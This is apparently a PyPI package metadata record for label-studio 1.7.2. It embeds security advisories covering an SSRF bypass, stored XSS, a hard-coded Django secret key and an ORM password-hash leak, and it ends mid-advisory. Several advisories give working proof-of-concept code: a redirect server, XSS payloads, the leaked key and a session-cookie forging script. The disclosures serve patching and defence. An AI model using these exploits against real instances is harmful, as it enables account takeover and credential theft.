3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":null,"project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/1.7.2/","requires_dist":["wheel","appdirs (>=1.4.3)","attr (==0.3.1)","attrs (>=19.2.0)","pyyaml (>=5.3.1)","azure-storage-blob (>=12.6.0)","boto (~=2.49.0)","boto3 (~=1.16.28)","botocore (~=1.19.28)","bleach (~=5.0.0)","google-api-core (==2.10.0)","google-auth (==2.11.0)","google-cloud-appengine-logging (==1.1.0)","google-cloud-audit-log (==0.2.0)","google-cloud-core (==2.3.2)","google-cloud-storage (~=2.5.0)","google-cloud-logging (~=2.7.0)","google-resumable-media (==2.3.3)","googleapis-common-protos (==1.56.4)","grpc-google-iam-v1 (==0.12.3)","Django (==3.2.16)","django-storages (==1.12.3)","django-annoying (==0.10.6)","django-debug-toolbar (==3.2.1)","django-filter (==2.4.0)","django-model-utils (==4.1.1)","django-rq (==2.5.1)","django-cors-headers (==3.6.0)","django-extensions (==3.1.0)","django-rest-swagger (==2.2.0)","django-user-agents (==0.4.0)","django-ranged-fileresponse (>=0.1.2)","drf-dynamic-fields (==0.3.0)","djangorestframework (==3.13.1)","drf-flex-fields (==0.9.5)","drf-yasg (==1.20.0)","drf-generators (==0.3.0)","htmlmin (==0.1.12)","jsonschema (==3.2.0)","lockfile (>=0.12.0)","lxml (>=4.2.5)","defusedxml (>=0.7.1)","numpy (==1.21.6)","ordered-set (==4.0.2)","pandas (>=0.24.0)","protobuf (>=3.15.5)","psycopg2 (==2.9.5)","pydantic (<=1.11.0,>=1.7.3)","python-dateutil (==2.8.1)","pytz (~=2019.3)","requests (<2.28,>=2.22.0)","rq (==1.10.1)","rules (==2.2)","ujson (>=3.0.0)","xmljson (==0.2.0)","colorama (>=0.4.4)","boxing (>=0.1.4)","redis (>=4.2.0)","sentry-sdk (>=1.1.0)","launchdarkly-server-sdk (==7.5.0)","python-json-logger (==2.0.4)","label-studio-converter (==0.0.50)","mysqlclient ; extra == 'mysql'"],"requires_python":">=3.6","summary":"Label Studio annotation tool","version":"1.7.2","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"c36a0e31d295bf1471225f500441fc9cdedf7453bdc96d064241600c2c24310d","md5":"28e1bb3f6204ddc6c3426ca0e3841589","sha256":"b52ea812430d2941d60137b65fa863f455f2d1ef3cbe43fb1c907b7e42899e59"},"downloads":-1,"filename":"label_studio-1.7.2-py3-none-any.whl","has_sig":false,"md5_digest":"28e1bb3f6204ddc6c3426ca0e3841589","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.6","size":46988517,"upload_time":"2023-03-20T16:52:25","upload_time_iso_8601":"2023-03-20T16:52:25.439710Z","url":"https://files.pythonhosted.org/packages/c3/6a/0e31d295bf1471225f500441fc9cdedf7453bdc96d064241600c2c24310d/label_studio-1.7.2-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"d2192106b6e98db7f23d81fe8f65cae14bb4273908592fd5239286644259cc54","md5":"fa39a716e232ae86d2ffc9fe175089aa","sha256":"736249ba92a2b4db6b316e98e044f9e521a51bded32475b7d687d0d3ae665b4b"},"downloads":-1,"filename":"label-studio-1.7.2.tar.gz","has_sig":false,"md5_digest":"fa39a716e232ae86d2ffc9fe175089aa","packagetype":"sdist","python_version":"source","requires_python":">=3.6","size":45965337,"upload_time":"2023-03-20T16:52:30","upload_time_iso_8601":"2023-03-20T16:52:30.567731Z","url":"https://files.pythonhosted.org/packages/d2/19/2106b6e98db7f23d81fe8f65cae14bb4273908592fd5239286644259cc54/label-studio-1.7.2.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry 